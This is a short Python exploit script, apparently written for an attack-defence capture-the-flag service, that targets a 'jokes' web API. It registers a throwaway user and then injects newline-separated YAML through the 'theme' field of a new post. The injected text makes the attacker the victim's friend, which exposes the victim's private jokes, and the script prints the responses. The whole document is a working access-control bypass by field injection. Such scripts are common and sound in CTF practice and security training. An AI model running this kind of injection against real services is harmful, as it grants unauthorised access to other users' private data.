#!/usr/bin/env python3
import random
import sys
from string import ascii_letters

import requests

HOST = sys.argv[1]
PORT = 18888
PUBLIC_FLAG_ID = sys.argv[2]


def get_random_string() -> str:
    return ''.join(random.choice(ascii_letters) for _ in range(20))


def sploit():
    url = f"http://{HOST}:{PORT}/api"

    username, theme = PUBLIC_FLAG_ID.split("+")

    token = requests.post(f"{url}/register", data={"username": get_random_string(), "password": "123"}).json()["token"]
    headers = {"Authorization": f"Bearer {token}"}

    resp = requests.get(f"{url}/jokes", data={"username": username, "theme": theme}, headers=headers)
    print(1, resp.text)

    resp = requests.post(f"{url}/jokes", data={"status": "private",
                                               "theme": f"zzzz\nfriends:\n  {username}: yes\nsome:",
                                               "text": "abacaba"}, headers=headers)
    print(2, resp.text)

    resp = requests.get(f"{url}/jokes", data={"username": username, "theme": theme}, headers=headers)
    print(3, resp.text)


if __name__ == '__main__':
    sploit()
